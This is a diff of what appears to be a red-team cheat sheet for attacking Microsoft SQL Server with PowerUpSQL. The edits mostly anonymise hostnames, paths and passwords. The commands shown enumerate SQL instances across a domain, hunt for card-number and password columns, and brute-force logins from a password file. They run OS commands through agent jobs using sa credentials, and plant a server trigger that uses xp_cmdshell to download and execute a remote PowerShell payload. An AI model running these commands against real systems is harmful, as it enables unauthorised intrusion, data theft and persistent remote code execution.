@@ -19,9 +19,9 @@ Get-Service -Name MSSQL*
 
 From Registries
 
-$sqlinstances = Get-ItemProperty -Path
+$si = Get-ItemProperty -Path
 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server'
-foreach ($SQLInstance in $SQLInstances) {
+foreach ($SQLInstance in $si) {
 foreach ($s in $SQLInstance.InstalledInstances){
 [PSCustomObject]@{
 PSComputerName = $SQLInstance.PSComputerName
@@ -61,28 +61,28 @@ Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads
 
 #Storing target to variable
 
-$targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.status -like "Accessible"}
+$tg = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.status -like "Accessible"}
 
-$targets
-$targets | Get-ServerInfo -verbose
-$targets | Get-SQLDatabase -Verbose | ft -AutoSize
-$targets | Get-SQLColumn | ft -AutoSize -- dumping column name
-$targets | Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keyword “card, password” –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSi  -- brute-forcing the column names from database
-$targets | Get-DatabaseUser -Versbose | ft -Autosize
+$tg
+$tg | Get-ServerInfo -verbose
+$tg | Get-SQLDatabase -Verbose | ft -AutoSize
+$tg | Get-SQLColumn | ft -AutoSize -- dumping column name
+$tg | Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keyword “card, password” –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSi  -- brute-forcing the column names from database
+$tg | Get-DatabaseUser -Versbose | ft -Autosize
 
 Interesting databases created with encryption flag on, or size or name
 
-$Databases = $targets | Get-SQLDatabaseThreaded -Verbose -Threads 10 -NoDefaults
-$Databases | Sort-Object DatabaseName 
-$Databases | Where-Object {$_.is_encrypted –eq “TRUE”}
+$db = $tg | Get-SQLDatabaseThreaded -Verbose -Threads 10 -NoDefaults
+$db | Sort-Object DatabaseName 
+$db | Where-Object {$_.is_encrypted –eq “TRUE”}
 
-$Databases | Sort-Object DatabaseName | Out-GridView (much better view)
+$db | Sort-Object DatabaseName | Out-GridView (much better view)
 
 ------------------------------------------------------------------------------------------------------------
 
 Auditing weak configurations
 
-Invoke-SQLAudit -Verbose -Instance WIN-0I0N2FIT2B1.hackme.pal\SQLEXPRESS | Out-GridView
+Invoke-SQLAudit -Verbose -Instance WIN-0I.hackme.pal\SQLEXPRESS | Out-GridView
 
 Enumerating weak login passwords:
 
@@ -92,7 +92,7 @@ $Accessible = $servers | where-object {$_.Status eq "Accessible"}
 
 $Accessible
 
-$Accessible | Invoke-SQLAuditWeakLoginPw -PassFile C:\Users\deep1792\Desktop\passwords.txt | Out-GridView (Brute-force)
+$Accessible | Invoke-SQLAuditWeakLoginPw -PassFile C:\Users\%\Desktop\passwords.txt | Out-GridView (Brute-force)
 
 -----------------------------------------------------------------------------------------------------------------
 
@@ -394,7 +394,7 @@ Invoke-SQLOSCmdAgentJob –Subsystem PowerShell -Username sa -Password Password1
 –Subsystem VBScript
 –Subsystem Jscript
 • List all jobs:
-Get-SQLAgentJob -Instance ops -username sa -Password Pass@123 -Verbose
+Get-SQLAgentJob -Instance ops -username sa -Password pass -Verbose
 
 ----------------------------------------------------------------------------------------------
 
@@ -545,7 +545,7 @@ AS
 BEGIN
 IF ORIGINAL_LOGIN() = 'testuser'
 EXEC master..xp_cmdshell 'powershell -C "iex (new-object
-System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'')"
+System.Net.WebClient).DownloadString(''http://<ip?/payload.ps1'')"
 '
 END;
 
@@ -555,9 +555,9 @@ SELECT * FROM sys.server_triggers -- All triggers
 Use testdb
 SELECT * FROM sys.server_triggers --Triggers for a database
 
-Get-SQLTriggerDdl -Instance ops-sqlsrvone -username sa -Password Pass-Verbose
+Get-SQLTriggerDdl -Instance <sql-instance>  -username sa -Password Pass-Verbose
 
-Get-SQLTriggerDml -Instance ops-sqlsrvone -username sa -Password Pass -Verbose
+Get-SQLTriggerDml -Instance <sql-instance> -username sa -Password Pass -Verbose
 
 
 ---------------------
